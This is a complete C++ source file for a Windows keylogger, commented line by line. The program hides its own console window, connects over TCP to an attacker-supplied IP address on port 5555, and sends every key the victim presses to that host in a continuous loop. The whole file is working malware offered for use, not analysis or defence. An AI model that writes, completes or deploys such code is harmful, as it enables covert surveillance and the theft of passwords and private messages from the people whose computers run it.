#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib") // allows us to use sockets (networking) functionality in Windows
#include <iostream> // standard input/output utilities
#include <winsock2.h> // networking utilities
#include <stdio.h> // standard input/output utilities
#include <stdlib.h> // standard input/output utilities
#include <Windows.h> // Windows libraries

int main() {
    // hide the program window 
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    // initialize usage of the winsock library 
    WSAStartup(MAKEWORD(2, 0), &WSAData);
    // set up a TCP socket
    server = socket(AF_INET, SOCK_STREAM, 0);

    // set the IP address of the target we wish to sent the data to
    addr.sin_addr.s_addr = inet_addr("put your IP address here");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    // connect to the previously set up target host/port.
    while (true) {
    // prevent this keylogger to consume a lot of CPU cycles
        Sleep(50);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }

    // close the socket
    closesocket(server);
    // clean up the Winsock library components.
    WSACleanup();
}